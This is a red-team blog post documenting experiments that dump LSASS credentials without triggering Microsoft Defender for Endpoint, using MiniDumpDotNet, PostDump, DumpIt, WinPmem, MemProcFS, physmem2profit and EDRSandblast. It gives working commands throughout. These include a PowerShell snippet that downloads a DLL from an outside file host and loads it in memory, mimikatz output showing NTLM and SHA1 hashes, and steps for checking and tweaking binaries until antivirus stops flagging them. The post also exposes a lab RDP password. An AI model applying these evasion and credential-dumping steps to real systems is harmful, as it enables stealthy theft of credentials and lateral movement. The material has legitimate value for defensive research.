---
title: Testing EDR boundaries - Experiments in modern MDE Evasion and LSASS Dumping Tactics
date: 2023-10-15 09:48:47 +07:00
categories: RedTeaming
#modified: 20-08-29 09:24:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: Experiments in modern MDE Evasion and LSASS Dumping Tactics
#thumbnail: "https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Paces_Review/lab.png"
#image: "https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Paces_Review/lab.png"
---

# Introduction

Oftentimes, once local administrative access is achieved on a single host, dumping LSASS allows for a chain of lateral movement, where one set of credentials is compromised that then has local admin access to another host, where additional credentials are stored in memory that has local admin elsewhere.

In the modern day it isn't possible to just to just inject into `lsass` without being flagged by AV's. Currently it is much safer to create a `minidump` of the `lsass` process and use that `minidump` on our host machine to retrieve credentials.

Detection mechanisms have evolved to detect dumping techniques by **hooking** the `MiniDumpWriteDump` function along with its associated `Win32 API` usage patterns. In addition, **opening up a new handle** to the `lsass.exe` process itself is also detected/blocked by many vendors. Dropping the memory dump of `lsass.exe` **to disk** is also an IoC, which is detected/blocked by some vendors. The signature of the dump file can be detected, most times the file gets instantly deleted.

## Setting up Microsoft Advanced Threat Protection

Signup for a trial version from: https://signup.microsoft.com/create-account/signup?products=7f379fee-c4f9-4278-b0a1-e4c8c2fcdf7e&ru=https://aka.ms/MDEp2OpenTrial?ocid=docs-wdatp-enablesiem-abovefoldlink

Setup an Evaluation lab:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020220820154525.png)

Add a device (In this case I setup Win11 with office):

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230825144227.png)

Download the `rdp config file` and `rdp` into the `testmachine` 

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230825144253.png)

```
Device name: testmachine1
User name: Administrator1

Password: m2rF[$xh{7?!
_To5Y0VD6yl}
H4mjIv-IjUBU
```

----

# Using custom APIs

## MiniDumpDotNet

To bypass EDR/AV hooks around the `MiniDumpWriteDump` function, we can try and use a custom rewritten reimplementation of the `MiniDumpWriteDump` function in a way that instead of utilizing the actual `MiniDumpWriteDump`. Originally a [BOF](https://github.com/rookuu/BOFs/tree/main/MiniDumpWriteDump) adapted a reimplementation of this API using some `ReactOS` [source code](https://doxygen.reactos.org/d8/d5d/minidump_8c_source.html).

[MiniDumpDotNet](https://www.whiteoaksecurity.com/blog/minidumpdotnet-part-2/) is an amazing project which is adapted from [NanoDump](https://github.com/helpsystems/nanodump) and released by [WhiteOakSecurity](https://github.com/WhiteOakSecurity). This project is an actual reimplementation of the `MiniDumpWriteDump` function based on the original  [BOF](https://github.com/rookuu/BOFs/tree/main/MiniDumpWriteDump) that introduced this and provides `.NET CLR` injectable LSASS process dumping capbility. Since this project dosen't use the  the  `Win32 API call MiniDumpWriteDump()` along with its associated Win32 API usage patterns, it circumvents and bypasses almost all EDR's/AV's and hence makes as a great out of the box solution for `lsass` dumping without detection /  modification for now.

The best part about this project is that it could be targetted to dump any process other than `lsass` with little to no detections, for instance: dumping processes's like `Outlook` in some cases result in finding cleartext login credentials.

### Tool Setup

Clone/Download the project: `PS> git clone https://github.com/WhiteOakSecurity/MiniDumpDotNet.git`

*Note: This project was implemented with `Visual Studio 2015`, but should be supported by any Visual Studio compiler that can build `VS C++ CLR` code. Building the solution will generate both a binary executable, as well as a .NET class library.*

Build the project: `Build -> Build Solution`

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020220820032054.png)

Testing using ThreatCheck:

```
PS D:\> .\ThreatCheck.exe -f D:\Tools\minidumpdotnet.exe
[+] No threat found!
```


Uploading on `VirusTotal` we have 0 detections (don't recommend doing so as it would add to cloud signatures):

	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020220820032153.png)

### Binary execution against EDR (MDE) - MiniDumpDotNet

Copy `minidumpdotnet.exe` to `C:\Tools` on a `testmachine`.

Enumerate the `lsass.exe` pid using `TaskManager`.

Next dump the `lsass` process in a CMD shell process as follows:  `.\minidumpdotnet.exe 844 mini.dmp`

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823143320.png)

Noting for any alerts, no new alerts are found:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823180900.png)

### PowerShell and dll execution against EDR (MDE) - MiniDumpDotNet

As above, compile seperately the project as a Class Library (.dll) and copy the .dll to the target `testmachine` to test execution against MDE.

Spawn a new PowerShell prompt and attempt the load the .dll into the PowerShell namespace and invoke the `DumpPid` sub function from the `MiniDump.MiniDump` entry point with the appropriate LSASS PID and .dmp file name as follows: 

```
[string]$assemblyPath = "C:\Tools\minidumpdotnet.dll"
Add-Type -Path $assemblyPath
[MiniDump.MiniDump]$a = New-Object -TypeName 'MiniDump.MiniDump'
$a.DumpPid(848, "C:\Tools\psh_dump.dmp")
```

```

$data = (New-Object System.Net.WebClient).DownloadData('http://filebin.net/opie5otqxjmpi68z/minidumpdotnet.dll')
$assem = [System.Reflection.Assembly]::Load($data)

Add-Type -TypeDefinition $assem
[MiniDump.MiniDump]$a = New-Object -TypeName 'MiniDump.MiniDump'
$a.DumpPid(836, "C:\users\Administrator\Desktop\psh_dump.dmp")

$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("AwesomeFunctionName")
$method.Invoke(0, $null)

# Define the URL of the DLL on the web server
$webDllUrl = "https://filebin.net/opie5otqxjmpi68z/minidumpdotnet.dll"

# Download the DLL from the web server and convert it to a byte array
$webResponse = Invoke-WebRequest -Uri $webDllUrl -UseBasicParsing
$assemblyBytes = $webResponse.RawContent

# Load the DLL from memory using Add-Type
Add-Type -TypeDefinition $assemblyBytes

# Use the MiniDump class from the loaded assembly
[MiniDump.MiniDump]$a = New-Object -TypeName 'MiniDump.MiniDump'

# Perform your desired actions
$a.DumpPid(836, "C:\users\Administrator\Desktop\psh_dump.dmp")
```


![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823180648.png)

Noting for any alerts, no new alerts are found:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823180840.png)

### Credential Extraction from dump file

Extract credentials form the .dmp file with `mimikatz` (I did this by copying the `minidump` file to my machine) as follows:

```
PS D:\> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::minidump mini.dmp
Switch to MINIDUMP : 'mini.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'mini.dmp' file for minidump...

Authentication Id : 0 ; 59179014 (00000000:03870006)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 23-08-2023 14:19:50
SID               : S-1-5-90-0-2
        msv :
        tspkg :
        wdigest :
         * Username : TestMachine1$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 59178986 (00000000:0386ffea)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 23-08-2023 14:19:50
SID               : S-1-5-90-0-2
        msv :
        tspkg :
        wdigest :
         * Username : TestMachine1$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

[......snip......]
```

<div style="page-break-after: always;"></div>

## PostDump

```
zbm:OenCdvE8
```

```
PS D:\Work\ADCS Challenges\Tools\ThreatCheck-master\ThreatCheck\ThreatCheck\bin\Release> .\ThreatCheck.exe -f D:\Work\BypassMDE\Tools\POSTDump-main\POSTDump\bin\x64\Release\POSTDump.exe -e defender
[+] Target file size: 81920 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0x13F9B
00000000   75 72 6E 3A 73 63 68 65  6D 61 73 2D 6D 69 63 72   urn:schemas-micr
00000010   6F 73 6F 66 74 2D 63 6F  6D 3A 61 73 6D 2E 76 32   osoft-com:asm.v2
00000020   22 3E 0D 0A 20 20 20 20  3C 73 65 63 75 72 69 74   ">··    <securit
00000030   79 3E 0D 0A 20 20 20 20  20 20 3C 72 65 71 75 65   y>··      <reque
00000040   73 74 65 64 50 72 69 76  69 6C 65 67 65 73 20 78   stedPrivileges x
00000050   6D 6C 6E 73 3D 22 75 72  6E 3A 73 63 68 65 6D 61   mlns="urn:schema
00000060   73 2D 6D 69 63 72 6F 73  6F 66 74 2D 63 6F 6D 3A   s-microsoft-com:
00000070   61 73 6D 2E 76 33 22 3E  0D 0A 20 20 20 20 20 20   asm.v3">··
00000080   20 20 3C 72 65 71 75 65  73 74 65 64 45 78 65 63     <requestedExec
00000090   75 74 69 6F 6E 4C 65 76  65 6C 20 6C 65 76 65 6C   utionLevel level
000000A0   3D 22 61 73 49 6E 76 6F  6B 65 72 22 20 75 69 41   ="asInvoker" uiA
000000B0   63 63 65 73 73 3D 22 66  61 6C 73 65 22 2F 3E 0D   ccess="false"/>·
000000C0   0A 20 20 20 20 20 20 3C  2F 72 65 71 75 65 73 74   ·      </request
000000D0   65 64 50 72 69 76 69 6C  65 67 65 73 3E 0D 0A 20   edPrivileges>··
000000E0   20 20 20 3C 2F 73 65 63  75 72 69 74 79 3E 0D 0A      </security>··
000000F0   20 20 3C 2F 74 72 75 73  74 49 6E 66 6F 3E 0D 0A     </trustInfo>··
```

```
urn:schemas-microsoft-com:asm.v2">··    <security>··      <requestedPrivileges xmlns="urn:schemas-microsoft-com:
 asm.v3">··
<requestedExecutionLevel level="asInvoker" uiAccess="false"/>·
</requestedPrivileges>··
</security>··
</trustInfo>··
```

Adding app.manifest:

Alter:

```
<requestedExecutionLevel level="requireAdministrator" uiAccess="false" />

TO:
<requestedExecutionLevel level="highestAvailable" uiAccess="false" />
```

contents:

```
<?xml version="1.0" encoding="utf-8"?>
<assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1">
  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
    <security>
      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
        <!-- UAC Manifest Options
             If you want to change the Windows User Account Control level replace the 
             requestedExecutionLevel node with one of the following.

        <requestedExecutionLevel  level="asInvoker" uiAccess="false" />
        <requestedExecutionLevel  level="requireAdministrator" uiAccess="false" />
        <requestedExecutionLevel  level="highestAvailable" uiAccess="false" />

            Specifying requestedExecutionLevel element will disable file and registry virtualization. 
            Remove this element if your application requires this virtualization for backwards
            compatibility.
        -->
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
      </requestedPrivileges>
    </security>
  </trustInfo>

  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <!-- A list of the Windows versions that this application has been tested on
           and is designed to work with. Uncomment the appropriate elements
           and Windows will automatically select the most compatible environment. -->

      <!-- Windows Vista -->
      <!--<supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}" />-->

      <!-- Windows 7 -->
      <!--<supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}" />-->

      <!-- Windows 8 -->
      <!--<supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}" />-->

      <!-- Windows 8.1 -->
      <!--<supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}" />-->

      <!-- Windows 10 -->
      <!--<supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}" />-->

    </application>
  </compatibility>

  <!-- Indicates that the application is DPI-aware and will not be automatically scaled by Windows at higher
       DPIs. Windows Presentation Foundation (WPF) applications are automatically DPI-aware and do not need 
       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should 
       also set the 'EnableWindowsFormsHighDpiAutoResizing' setting to 'true' in their app.config. 
       
       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -->
  <!--
  <application xmlns="urn:schemas-microsoft-com:asm.v3">
    <windowsSettings>
      <dpiAware xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</dpiAware>
      <longPathAware xmlns="http://schemas.microsoft.com/SMI/2016/WindowsSettings">true</longPathAware>
    </windowsSettings>
  </application>
  -->
</assembly>
```

```
PS D:\Work\ADCS Challenges\Tools\ThreatCheck-master\ThreatCheck\ThreatCheck\bin\Release> .\ThreatCheck.exe -f D:\Work\BypassMDE\Tools\POSTDump-main\POSTDump\bin\x64\Release\POSTDump.exe
[+] No threat found!
```

## PPLMedic

```
PS D:\Work\ADCS Challenges\Tools\ThreatCheck-master\ThreatCheck\ThreatCheck\bin\Release> .\ThreatCheck.exe -f  D:\Work\BypassMDE\Tools\PPLmedic-master\x64\Release\PPLmedic.exe
[+] Target file size: 206336 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0x9E85
00000000   00 63 00 6F 00 64 00 65  00 3A 00 20 00 30 00 78   ·c·o·d·e·:· ·0·x
00000010   00 25 00 30 00 38 00 78  00 29 00 2E 00 0D 00 0A   ·%·0·8·x·)·.····
00000020   00 00 00 00 00 00 00 00  00 00 00 5B 00 2D 00 5D   ···········[·-·]
00000030   00 20 00 55 00 6E 00 65  00 78 00 70 00 65 00 63   · ·U·n·e·x·p·e·c
00000040   00 74 00 65 00 64 00 20  00 65 00 72 00 72 00 6F   ·t·e·d· ·e·r·r·o
00000050   00 72 00 20 00 6F 00 72  00 20 00 74 00 69 00 6D   ·r· ·o·r· ·t·i·m
00000060   00 65 00 6F 00 75 00 74  00 20 00 77 00 68 00 69   ·e·o·u·t· ·w·h·i
00000070   00 6C 00 65 00 20 00 74  00 72 00 79 00 69 00 6E   ·l·e· ·t·r·y·i·n
00000080   00 67 00 20 00 74 00 6F  00 20 00 63 00 72 00 65   ·g· ·t·o· ·c·r·e
00000090   00 61 00 74 00 65 00 20  00 61 00 20 00 72 00 65   ·a·t·e· ·a· ·r·e
000000A0   00 6D 00 6F 00 74 00 65  00 20 00 54 00 61 00 73   ·m·o·t·e· ·T·a·s
000000B0   00 6B 00 48 00 61 00 6E  00 64 00 6C 00 65 00 72   ·k·H·a·n·d·l·e·r
000000C0   00 20 00 69 00 6E 00 73  00 74 00 61 00 6E 00 63   · ·i·n·s·t·a·n·c
000000D0   00 65 00 2E 00 0D 00 0A  00 00 00 4C 00 61 00 75   ·e·.·······L·a·u
000000E0   00 6E 00 63 00 68 00 44  00 65 00 74 00 65 00 63   ·n·c·h·D·e·t·e·c
000000F0   00 74 00 69 00 6F 00 6E  00 4F 00 6E 00 6C 00 79   ·t·i·o·n·O·n·l·y
```

----

# Using full memory dumps

## Extracting LSASS credentials from raw memory dumps

DumpIt is a closed source tool made primarily for forensic analysis, that uses a driver to dump all the physical memory into a file. Because the dumps size depends on the amount of memory available and can be quite large, retrieving and exfiltrating one from a remote system is usually slow and not feasible.

To ease this process, MemProcFS allows mounting raw memory dumps, then in the mount folder a minidump folder contains the LSASS minidump that is compatible with mimikatz or pypykatz.

Requirement:  Around 17gb free disk space for the raw memory dump.

### Tool Setup

Begin by downloading [DumpIt](https://github.com/h4sh5/DumpIt-mirror) and [MemProcFS](https://github.com/ufrisk/MemProcFS). Next Copy DumpIt onto the `testmachine`.

Analysis using ThreatCheck:

```
PS D:\> .\ThreatCheck.exe -f D:\Tools\DumpIt.exe
[+] No threat found!

PS D:\> .\ThreatCheck.exe -f D:\Tools\winpmem.exe
[+] No threat found!

PS D:\> .\ThreatCheck.exe -f D:\Tools\MemProcFS\MemProcFS.exe
[+] No threat found!
```

### Local Binary execution against EDR (MDE) - DumpIt, WinPmem and MemProcFS analysis

Copy DumpIt and MemprocFS onto the `testmachine`.

Enumerate the LSASS PID using `Task Manager` as before and next perform a raw physical memory dump using DumpIt as follows:

```
C:\Tools> .\DumpIt.exe 856

  DumpIt 3.0.20171228.1
  Copyright (C) 2007 - 2017, Matthieu Suiche <http://www.msuiche.net>
  Copyright (C) 2012 - 2014, MoonSols Limited <http://www.moonsols.com>
  Copyright (C) 2015 - 2017, Comae Technologies FZE <http://www.comae.io>

    Destination path:           \??\C:\Tools\TestMachine4-20230825-103250.dmp

    Computer name:              TestMachine4


    --> Proceed with the acquisition ? [y/n] y

    [+] Information:
    Dump Type:                   Microsoft Crash Dump


    [+] Machine Information:
    Windows version:             10.0.22000
    MachineId:                   AA14A121-1AC4-4BA5-ABE3-A92C29E5CC8C
    TimeStamp:                   133374331773010432
    Cr3:                         0x6d5002
    KdCopyDataBlock:             0xfffff8036336375c
    KdDebuggerData:              0xfffff80363a02190
    KdpDataBlockEncoded:         0xfffff80363b018c8

    Current date/time:          [2023-08-25 (YYYY-MM-DD) 10:32:57 (UTC)]
    + Processing... Done.

    Acquisition finished at:    [2023-08-25 (YYYY-MM-DD) 10:35:06 (UTC)]
    Time elapsed:               2:09 minutes:seconds (129 secs)

    Created file size:           17178701824 bytes (16382 Mb)
    Total physical memory size:  16382 Mb

    NtStatus (troubleshooting):   0x00000000
    Total of written pages:       4194017
    Total of inacessible pages:         0
    Total of accessible pages:    4194017

    SHA-256: F0D5EB9970C4518E5736F4EDDEC700665BE71273148AE9AFD11AE4CBE6281903

    JSON path:                  C:\Tools\TestMachine4-20230825-103250.json
```

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230825160553.png)

It is possible to similar create such forensic dumps without alerts using other trusted tools such as WinPmem:

```
C:\Tools>.\winpmem.exe dump.raw
WinPmem64
Extracting driver to C:\Users\ADMINI~1\AppData\Local\Temp\pmeFDEC.tmp
Driver Unloaded.
Loaded Driver C:\Users\ADMINI~1\AppData\Local\Temp\pmeFDEC.tmp.
Deleting C:\Users\ADMINI~1\AppData\Local\Temp\pmeFDEC.tmp
The system time is: 11:25:24
Will generate a RAW image
 - buffer_size_: 0x1000
CR3: 0x00006D5002
 4 memory ranges:
Start 0x00001000 - Length 0x0009F000
Start 0x00100000 - Length 0x3FE41000
Start 0x3FFFF000 - Length 0x00001000
Start 0x100000000 - Length 0x3C0000000
max_physical_memory_ 0x4c0000000
Acquitision mode PTE Remapping
Padding from 0x00000000 to 0x00001000
pad
 - length: 0x1000

[....snip....]

The system time is: 11:27:31
Driver Unloaded.
```

Analyse the .dmp using MemProcFS and accept the EULA when prompted. 

*NOTE: MemProcFS requires this the [Dokan-Setup.exe package](https://github.com/dokan-dev/dokany/releases) installed.*

```
C:\Tools> .\MemProcFS\MemProcFS.exe -device TestMachine4-20230825-103250.dmp
Initialized 64-bit Windows 10.0.22000

==============================  MemProcFS  ==============================
 - Author:           Ulf Frisk - pcileech@frizk.net
 - Info:             https://github.com/ufrisk/MemProcFS
 - License:          GNU Affero General Public License v3.0
   ---------------------------------------------------------------------
   MemProcFS is free open source software. If you find it useful please
   become a sponsor at: https://github.com/sponsors/ufrisk Thank You :)
   ---------------------------------------------------------------------
 - Version:          5.8.0 (Windows)
 - Mount Point:      M:\
 - Tag:              22000_e3ec0d2b
 - Operating System: Windows 10.0.22000 (X64)
==========================================================================
```

Next copy the minidump file from the mount point onto `C:\Tools` as follows:

```
M:\> copy M:\name\lsass.exe-856\minidump C:\Tools
M:\name\lsass.exe-856\minidump\readme.txt
M:\name\lsass.exe-856\minidump\minidump.dmp
        2 file(s) copied.
```

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230825162641.png)

Note that the size of this minidump is as much as normal minidump for lsass would be making this easy to exfiltrate.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230825162936.png)

Noting for any alerts, no new alerts are found:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823180840.png)


### Remote Binary execution against EDR (MDE) - MemProcFS 

It is possible to use MemProcFS to remotely perform the analysis as showcased [here](https://github.com/ufrisk/MemProcFS/wiki/_Remoting). 

Spawn another testmachine. We will be performing the dump from non-domain joined machines. One requirement is the installation of the [leechAgent](https://github.com/ufrisk/LeechCore/releases/tag/v2.16) on the target running as a service. This can be done remotely in a domain joined environment. In this case we install this agent on the target manually.

Make sure this service is running as SYSTEM. Next on the remote computer perform a dump analysis as above using the `-remote` and `-remotefs` parameters as follows:

```
C:\Tools\LeechAgent_files_and_binaries_v2.16.0-win_x64-20230820> .\leechagent.exe -install
LeechAgent: Service installed successfully.

C:\Tools\LeechAgent_files_and_binaries_v2.16.0-win_x64-20230820> sc query leechagent
SERVICE_NAME: leechagent
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Now on the remote system run MemProcFS as follows:

```
C:\Tools>.\MemProcFS\MemProcFS.exe -device C:\Tools\TestMachine4-20230825-103250.dmp -remote smb://ntlm:10.1.1.4:logon -remotefs
```

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230825182059.png)

Perform the analysis now in the remote system as showcased above.

### Remote Binary execution against EDR (MDE) - physmem2profit

A more and better way to perform the same remote analysis without installing dependencies like `leechAgent` is by using the [physmem2profit](https://github.com/WithSecureLabs/physmem2profit) project specially created for this purpose from a remote non domain joined linux system.

The Physmem2profit project in short exposes the physical RAM using the Winpmem driver through a TCP port (server component) and remotely connects and analyses this memory image to create a minidump of the LSASS process (client component).

This mainly removes the overhead of exfiltrating a huge memory image file as showcased in above methods.

For testing this we require 2 machines: One preferably Linux and the other being a Windows target. A sample setup is showcased below.

*WIP: Having problem with python3 dependencies during installation: Rekall lib. - Install on Ubuntu 20.04*

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230907180934.png)


![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230907180913.png)

Begin by installing the client component on the Linux VM as follows:

```
PS C:\Users\shari> ssh administrator1@testserver6-zdgiahopzwqiy.centralus.cloudapp.azure.com

administrator1@TestServer6:~$ sudo apt-get update -y

administrator1@TestServer6:~$ git clone --recurse-submodules 

administrator1@TestServer6:~$ bash physmem2profit/client/install.sh

administrator1@TestServer6:~/physmem2profit/client$ source .env/bin/activate
```

Next compile the server component on a Windows Machine using Visual Studio and check for detections as follows:

```
PS D:\> .\ThreatCheck.exe -f D:\Tools\Physmem2profit.exe
[+] No threat found!
```

Now transfer the compiled binary to the Windows target and execute it to setup a server loading the Winpmem driver to expose the physical RAM.

```
C:\Tools>.\Physmem2profit.exe --ip 10.1.1.68 --port 80
[*] Registering driver bridges.
[+] Found driver bridge: WinPmem.
[+]    Registered command: Install.
[+]    Registered command: Uninstall.
[+]    Registered command: Map.
[+]    Registered command: Read.
[*] Starting server on 10.1.1.68:80...
[+] Server Started.
[*] Waiting for a connection...
[+] Connected!
[*] Installing service...
[*] Creating service phys2profit...
[+] Service created successfully.
[*] Starting service...
[*] Service is stopped. Trying to start it...
[+] Driver service started.
[+] Successfully installed the WinPMem driver.
[*] Service is running. Trying to stop it...
[+] Successfully unloaded the WinPMem driver.
[*] Exit command received. Terminating.
```

Back in the Linux VM, execute the client component to remotely extract the LSASS minidump from the Physmem2profit server. 

```
(.env) administrator1@TestServer6:~/physmem2profit/client$ python3 physmem2profit/ --mode all --host 10.1.1.68 --port 80
 --driver winpmem --install winpmem_x64.sys --label edr-bypass
/home/administrator1/physmem2profit/client/.env/lib/python3.6/site-packages/rekall/plugins/windows/dumpcerts.py:27: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography. The next release of cryptography will remove support for Python 3.6.
  from cryptography import x509
[*] Connecting to 10.1.1.68 on port 80
[*] Connected
[*] Loading config from config.json
[*] Driver installed
[*] Wrote config to config.json
[*] Exposing the physical memory as a file
[*] Analyzing physical memory
[*] Finding LSASS process
[*] LSASS found
[*] Checking for Credential Guard...
[*] No Credential Guard detected
[*] Collecting data for minidump: system info
[*] Collecting data for minidump: module info
[*] Collecting data for minidump: memory info and content
[*] Generating the minidump file
[*] Wrote LSASS minidump to output/edr-bypass-2023-09-07-lsass.dmp
[*] Read 71 MB, cached reads 10 MB
```

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230907180732.png)

Noting for any alerts, no new alerts are found:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823180840.png)

### Credential Extraction from dump file

Exfiltrate the minidmp file from `C:\Tools\minidump` back onto our local machine by a simple Copy - Paste and parse it using mimikatz as follows:

```
PS D:\Work\CRTPwithSLiver\Tools\mimikatz_trunk\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::minidump minidump.dmp
Switch to MINIDUMP : 'minidump.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'minidump.dmp' file for minidump...

Authentication Id : 0 ; 1276576 (00000000:00137aa0)
Session           : Interactive from 1
User Name         : administrator1
Domain            : TestMachine4
Logon Server      : TestMachine4
Logon Time        : 25-08-2023 14:40:22
SID               : S-1-5-21-3554741335-746861664-1298996758-500
        msv :
         [00000003] Primary
         * Username : administrator1
         * Domain   : TestMachine4
         * NTLM     : 1dafe71b6fd9a0e1b68106cd0204eadd
         * SHA1     : 4f91a429b36ec0458422b9f8e83b028a190aff90
         * DPAPI    : 4f91a429b36ec0458422b9f8e83b028a
        tspkg :
        wdigest :
         * Username : administrator1
         * Domain   : TestMachine4
         * Password : (null)
        kerberos :
         * Username : administrator1
         * Domain   : TestMachine4
         * Password : (null)
        ssp :
        credman :
        cloudap :

[...snip...]
```

<div style="page-break-after: always;"></div>

----

# Using Exploits instead of Vulnerable Signed Drivers

## Binary execution against EDR (MDE) - EDRSandblast-GodFault

[EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast) is a tool that leverages a vulnerable signed driver (`RTCore64.sys`) to bypass EDR Kernel Routine Callbacks, Object Callbacks, ETW tracing and LSASS protections. It includes both userland and kernelmode techniques  to evade monitoring.

It is possible to perform the same functionality as the vulnerable signed driver using the [GodFault exploit](https://github.com/gabriellandau/PPLFault#godfault).

Compiling and analysing for signatures we find that EDRSandblast is detected.

```
D:\>.\ThreatCheck.exe -f D:\Tools\EDRSandblast.exe -e amsi
[+] Target file size: 328192 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0x501FD
00000000   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000010   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000020   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000050   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000070   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000080   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000090   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
000000A0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
000000B0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
000000C0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
000000D0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
